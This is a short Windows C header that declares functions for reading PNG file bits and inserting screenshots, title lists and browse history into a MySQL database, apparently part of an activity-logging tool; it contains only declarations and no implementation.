#pragma once
#define _CRT_SECURE_NO_WARNINGS
#include <mysql.h>
#include <strsafe.h>
#include "registry.h"

#define MYSQL_MEDIUMBLOB_MAX 16777215

_Check_return_
_Post_equals_last_error_
__drv_allocatesMem(Mem)
DWORD WINAPI GetPNGBits(
	_In_reads_or_z_(MAX_PATH) WCHAR *wszFilePath,
	_Outptr_ BYTE **pbBits,
	_Out_ PLARGE_INTEGER pliFileSize
);

INT WINAPI InsertScreenshot(WCHAR *wszFileName);
INT WINAPI InsertTitleList(WCHAR *wszFileName);
INT WINAPI InsertBrowseHistory(WCHAR *wszFileName);